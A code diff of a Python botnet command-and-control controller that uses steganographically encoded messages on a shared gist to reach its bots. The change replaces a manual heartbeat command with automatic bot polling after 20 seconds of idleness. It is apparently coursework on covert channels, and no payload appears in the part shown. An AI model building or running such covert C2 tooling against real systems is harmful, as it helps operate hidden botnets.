@@ -2,6 +2,7 @@ import sys
 import uuid
 from datetime import datetime
 from pytimedinput import timedInput
+from time import sleep
 
 sys.path.append('..')
 from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment, reset_gist
@@ -11,7 +12,7 @@ from common.chapters import get_chapter_for_path_encoding, get_chapter_for_comma
 from common.steganography import encode_to_text, decode_from_text
 
 
-HEARTBEAT_TIME = 60
+HEARTBEAT_TIME = 20
 
 
 def encode_path(pth):
@@ -21,25 +22,21 @@ def encode_path(pth):
     return encoded_pth[0:used_length]
 
 
-def check_heartbeat(minutes):
-    print(f'Starting to check heartbeat for {minutes} minutes...', flush=True)
-    print('Type "stop" to stop it', flush=True)
-    for i in range(minutes):
-        msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
-        now = datetime.now()
+def check_heartbeat():
+    print('Checking heartbeat...', flush=True)
+    msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
+    now = datetime.now()
 
-        for _ in range(10):
-            x, _ = timedInput('> ', timeout=6)
-            print('\033[A\033[A')
-            if x == 'stop':
-                print(f'Stopping heartbeat...', flush=True)
-                return
+    print('Waiting for replies (20 seconds)...', flush=True)
+    for i in range(20):
+        print('.', end='', flush=True)
+        sleep(1)
+    print('.', flush=True)
 
-        replies = get_replies_to_msg_id(msg_id)
-        bot_names = list(map(lambda x: x[0], replies))
-        bot_names_str = f' ({"".join(bot_names)})' if len(bot_names) > 0 else ''
-        print(f'({i + 1}/{minutes}) Active bots ({now}): {len(bot_names)}{bot_names_str}', flush=True)
-    print(f'Heartbeat finished...', flush=True)
+    replies = get_replies_to_msg_id(msg_id)
+    bot_names = list(map(lambda x: x[0], replies))
+    bot_names_str = f' ({"".join(bot_names)})' if len(bot_names) > 0 else ''
+    print(f'Active bots ({now}): {len(bot_names)}{bot_names_str}', flush=True)
 
 
 def process_cmd(cmd):
@@ -81,9 +78,6 @@ def process_cmd(cmd):
         reset_gist()
         print('Gist reset to initial message', flush=True)
 
-    elif len(cmd_parts) == 2 and cmd_parts[0] == 'heartbeat' and cmd_parts[1].isdigit():
-        check_heartbeat(int(cmd_parts[1]))
-
     else:
         print(f'Unknown command: {cmd}', flush=True)
 
@@ -95,11 +89,15 @@ def run():
     print(f'Controller is running as {CONTROLLER_NICK_NAME}...')
 
     while True:
-        cmd = input('BSY CC > ')
-        if cmd == 'exit' or cmd == 'quit':
+        cmd, timed_out = timedInput('BSY CC > ', timeout=HEARTBEAT_TIME)
+        if timed_out:
+            print('User is idle...')
+            check_heartbeat()
+        elif cmd == 'exit' or cmd == 'quit':
             print('Exiting BSY CC...')
             break
-        process_cmd(cmd)
+        else:
+            process_cmd(cmd)
 
 
 if __name__ == '__main__':
